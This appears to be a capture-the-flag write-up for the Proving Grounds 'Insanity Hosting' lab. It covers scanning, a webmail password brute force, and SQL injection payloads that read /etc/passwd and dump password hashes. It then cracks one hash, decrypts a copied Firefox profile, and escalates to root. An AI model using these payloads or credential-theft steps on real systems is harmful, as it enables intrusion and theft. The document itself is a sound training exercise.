---
layout: default
title: Insanity Hosting
parent: Proving Grounds Play
nav_order: 32
---

# Scanning

---

```bash

┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/insanityhosting]
└─$ sudo nmap -Pn -p- -sC -sV -T4 --open 192.168.202.124
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-18 10:48 EST
Nmap scan report for 192.168.202.124
Host is up (0.056s latency).
Not shown: 65378 filtered tcp ports (no-response), 154 filtered tcp ports (host-prohibited)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.45.217
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: ERROR
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 85:46:41:06:da:83:04:01:b0:e4:1f:9b:7e:8b:31:9f (RSA)
|   256 e4:9c:b1:f2:44:f1:f0:4b:c3:80:93:a9:5d:96:98:d3 (ECDSA)
|_  256 65:cf:b4:af:ad:86:56:ef:ae:8b:bf:f2:f0:d9:be:10 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/7.2.33)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/7.2.33
|_http-title: Insanity - UK and European Servers
| http-methods:
|_  Potentially risky methods: TRACE
Service Info: OS: Unix

```

# Enumeration

---

## 80 | HTTP

Static site without any active links.

![index](../../../assets/images/ctfs/proving_grounds/insanity_hosting/index.png)

### Gobuster

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/insanityhosting]
└─$ gobuster dir -u http://192.168.202.124 -w /usr/share/wordlists/custom/large_final.txt -x aspx,php,tx
t,conf -t 80 -k
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.202.124
[+] Method:                  GET
[+] Threads:                 80
[+] Wordlist:                /usr/share/wordlists/custom/large_final.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              php,txt,conf,aspx
[+] Timeout:                 10s
===============================================================
2023/11/18 10:53:54 Starting gobuster in directory enumeration mode                                     ===============================================================
/news                 (Status: 301) [Size: 236] [--> http://192.168.202.124/news/]
/index.php            (Status: 200) [Size: 31]
/img                  (Status: 301) [Size: 235] [--> http://192.168.202.124/img/]
/data                 (Status: 301) [Size: 236] [--> http://192.168.202.124/data/]
/.htaccess.aspx       (Status: 403) [Size: 216]
/.htaccess.conf       (Status: 403) [Size: 216]
/.htaccess            (Status: 403) [Size: 211]
/.htaccess.txt        (Status: 403) [Size: 215]
/.htpasswd            (Status: 403) [Size: 211]
/.htpasswd.txt        (Status: 403) [Size: 215]
/.htaccess.php        (Status: 403) [Size: 215]
/.htpasswd.aspx       (Status: 403) [Size: 216]
/.htpasswd.php        (Status: 403) [Size: 215]
/.htpasswd.conf       (Status: 403) [Size: 216]
Progress: 3119 / 1082015 (0.29%)[ERROR] 2023/11/18 10:54:05 [!] Get "http://192.168.202.124/spacer.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2023/11/18 10:54:05 [!] Get "http://192.168.202.124/spacer.aspx": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2023/11/18 10:54:05 [!] Get "http://192.168.202.124/11.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2023/11/18 10:54:05 [!] Get "http://192.168.202.124/11.aspx": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] 2023/11/18 10:54:05 [!] Get "http://192.168.202.124/11": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
/css                  (Status: 301) [Size: 235] [--> http://192.168.202.124/css/]
/js                   (Status: 301) [Size: 234] [--> http://192.168.202.124/js/]
/webmail              (Status: 301) [Size: 239] [--> http://192.168.202.124/webmail/]
/fonts                (Status: 301) [Size: 237] [--> http://192.168.202.124/fonts/]
/monitoring           (Status: 301) [Size: 242] [--> http://192.168.202.124/monitoring/]
/licence              (Status: 200) [Size: 57]
/phpmyadmin           (Status: 301) [Size: 242] [--> http://192.168.202.124/phpmyadmin/]
/phpinfo.php          (Status: 200) [Size: 85291]
/cgi-bin/             (Status: 403) [Size: 210]

```

Curl directories and files

```bash
# data
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/insanityhosting]
└─$ curl http://192.168.202.124/data/ | html2text
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1091  100  1091    0     0   9704      0 --:--:-- --:--:-- --:--:--  9741
****** Index of /data ******
[[ICO]]       Name             Last_modified    Size Description
===========================================================================
[[PARENTDIR]] Parent_Directory                    -  
[[   ]]       EMPTY            2020-01-30 19:06    6  
[[   ]]       VERSION          2020-01-30 19:06    6  
===========================================================================

┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/insanityhosting]
└─$ curl http://192.168.202.124/data/VERSION
1.14.0


```

_/monitoring_ hash a login page

![mon_login](../../../assets/images/ctfs/proving_grounds/insanity_hosting/mon_login.png)

_/webmail_ has a login page

![webmail](../../../assets/images/ctfs/proving_grounds/insanity_hosting/webmail.png)

Checking searchsploit there is an RCE exploit for SquirrelMail version 1.4.22 that requires credentials.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/insanityhosting]
└─$ searchsploit squirrelmail
---------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                        |  Path
---------------------------------------------------------------------- ---------------------------------
SquirrelMail < 1.4.22 - Remote Code Execution                         | linux/remote/41910.sh

```

Use Burp to brute force the login and get a hit on the very first password _123456_

![intruder](../../../assets/images/ctfs/proving_grounds/insanity_hosting/intruder.png)

After logging onto squirrelmail we don't maind any messages.

![mail1](../../../assets/images/ctfs/proving_grounds/insanity_hosting/mail1.png)

Added 2 hosts to the Monitoring system, one valid and one invalid, we receive an email for the invalid host saying it is down.

![mon2](../../../assets/images/ctfs/proving_grounds/insanity_hosting/mon2.png)

![mail2](../../../assets/images/ctfs/proving_grounds/insanity_hosting/mail2.png)

Test for SQLi

The payload _" OR 1=1 -- -_ in the Title field results in successful SQLi and dumping the database.

![sql1](../../../assets/images/ctfs/proving_grounds/insanity_hosting/sql1.png)

![mail3](../../../assets/images/ctfs/proving_grounds/insanity_hosting/mail3.png)

The payload _" UNION SELECT null, @@version,null,null -- -_ successfully lists the database version.

![sql2](../../../assets/images/ctfs/proving_grounds/insanity_hosting/sql2.png)

![mail4](../../../assets/images/ctfs/proving_grounds/insanity_hosting/mail4.png)

The payload _" UNION SELECT null,LOAD_FILE('/etc/passwd'),null,null -- -_ successfully lists the database version.

![sql3](../../../assets/images/ctfs/proving_grounds/insanity_hosting/sql3.png)

![mail5](../../../assets/images/ctfs/proving_grounds/insanity_hosting/mail5.png)

### Try to list users _elliot_ or _nicholas_ RSA private key

The payload _" UNION SELECT null,LOAD_FILE('/home/nicholas/.ssh/id_rs'),null,null -- -_ for user _nicholas_

The payload _" UNION SELECT null,LOAD_FILE('/home/elliot/.ssh/id_rs'),null,null -- -_ for user _elliot_

Neither worked.

![mail6](../../../assets/images/ctfs/proving_grounds/insanity_hosting/mail6.png)

### Get user password hashes.

_Step 1_ | Get the table names

The payload _" UNION SELECT null,group_concat(table_name),null,null from information_schema.tables where table_schema = database() -- - _

![mail7](../../../assets/images/ctfs/proving_grounds/insanity_hosting/mail7.png)

We have table names: _hosts_, _log_, and _users_

_Step 2_ | Get the column names for the _users_ table

The payload _" UNION SELECT null,group_concat(column_name),null,null from information_schema.columns where table_schema = database() and table_name = 'users' -- - _

We have the columns: _id_, _username_, _password_, and _email_

![mail8](../../../assets/images/ctfs/proving_grounds/insanity_hosting/mail8.png)

_Step 3_ | Extract the records from the _users_ table.

The payload _" UNION SELECT null,group_concat(username,password,email),null,null from users -- - _

![mail9](../../../assets/images/ctfs/proving_grounds/insanity_hosting/mail9.png)

We get the following hashes back:

```bash
admin$2y$12$huPSQmbcMvgHDkWIMnk9t.1cLoBWue3dtHf9E5cKUNcfKTOOp8cmaadmin@insanityhosting.vm

nicholas$2y$12$4R6JiYMbJ7NKnuQEoQW4ruIcuRJtDRukH.Tvx52RkUfx5eloIw7Qenicholas@insanityhosting.vm

otis$2y$12$./XCeHl0/TCPW5zN/E9w0ecUUKbDomwjQ0yZqGz5tgASgZg6SIHFWotis@insanityhosting.vm
```

Unable to get any to crack

# Exploitation

---

## SQLi to Extract MySQL Users Table Records

While we could not get the hashes to crack from the _users_ table we will attempt to get the password hash from the _mysql.user_ table.

The payload " UNION SELECT null,group_concat(user,password,authentication_string),null,null from mysql.user -- -

![mail10](../../../assets/images/ctfs/proving_grounds/insanity_hosting/mail10.png)

We get the following hashes:

```bash
root*CDA244FF510B063DA17DFF84FF39BA0849F7920F
elliot*5A5749F309CAC33B27BA94EE02168FA3C3E7A3E9
```

Name That Hash thinks it is SHA-1

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/insanityhosting]
└─$ nth --file hash.txt

  _   _                           _____ _           _          _   _           _
 | \ | |                         |_   _| |         | |        | | | |         | |
 |  \| | __ _ _ __ ___   ___ ______| | | |__   __ _| |_ ______| |_| | __ _ ___| |__
 | . ` |/ _` | '_ ` _ \ / _ \______| | | '_ \ / _` | __|______|  _  |/ _` / __| '_ \
 | |\  | (_| | | | | | |  __/      | | | | | | (_| | |_       | | | | (_| \__ \ | | |
 \_| \_/\__,_|_| |_| |_|\___|      \_/ |_| |_|\__,_|\__|      \_| |_/\__,_|___/_| |_|

https://twitter.com/bee_sec_san
https://github.com/HashPals/Name-That-Hash


5A5749F309CAC33B27BA94EE02168FA3C3E7A3E9

Most Likely
SHA-1, HC: 100 JtR: raw-sha1 Summary: Used for checksums.See more
HMAC-SHA1 (key = $salt), HC: 160 JtR: hmac-sha1
Haval-128, JtR: haval-128-4
RIPEMD-128, JtR: ripemd-128
```

John won't crack it but Crackstation hash it as _elliot123_

![crack](../../../assets/images/ctfs/proving_grounds/insanity_hosting/crack.png)

We can SSH with the creds _elliot:elliot123_

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/insanityhosting]
└─$ ssh elliot@192.168.202.124
elliot@192.168.202.124's password:
[elliot@insanityhosting ~]$ id
uid=1003(elliot) gid=1003(elliot) groups=1003(elliot)

```

# Post-Exploitation

---

## Enumerate /home/elliot

There is a _.mozilla_ directory we can maybe get creds from.

Tar the directory and transfer to our attack machine.

```bash

# Tar the entire .mozilla directory
[elliot@insanityhosting ~]$ tar -czf mozilla.tgz .mozilla/

# Netcat not available so use SCP to transfer to attack box
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/insanityhosting]
└─$ scp elliot@192.168.202.124:mozilla.tgz .
elliot@192.168.202.124s password:
mozilla.tgz                                                           100%   40MB   1.9MB/s   00:21

# Extract the files
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/insanityhosting]
└─$ tar -xzf mozilla.tgz


```

We'll use the _firefox_decrypt.py_ script to extract any credentials in the Mozilla files.

[Firefox Decrypt GitHub Raw Code](https://raw.githubusercontent.com/unode/firefox_decrypt/main/firefox_decrypt.py)

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/insanityhosting]
└─$ wget https://raw.githubusercontent.com/unode/firefox_decrypt/main/firefox_decrypt.py
--2023-11-18 21:24:26--  https://raw.githubusercontent.com/unode/firefox_decrypt/main/firefox_decrypt.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.111.133, 185.199.110.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 39242 (38K) [text/plain]
Saving to: ‘firefox_decrypt.py’

firefox_decrypt.py        100%[=====================================>]  38.32K  --.-KB/s    in 0.01s

2023-11-18 21:24:26 (3.01 MB/s) - ‘firefox_decrypt.py’ saved [39242/39242]


```

Run the _firefox_decrypt.py_ on _.mozilla/firefox_

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/insanityhosting]
└─$ python3 firefox_decrypt.py .mozilla/firefox/
Select the Mozilla profile you wish to decrypt
1 -> wqqe31s0.default
2 -> esmhp32w.default-default
2

Website:   https://localhost:10000
Username: 'root'
Password: 'S8Y389KJqWpJuSwFqFZHwfZ3GnegUa'

```

Use the extracted password to switch to the _root_ user.

```bash
[elliot@insanityhosting ~]$ su root
Password:
[root@insanityhosting elliot]# id
uid=0(root) gid=0(root) groups=0(root)
[root@insanityhosting elliot]# whoami
root

```
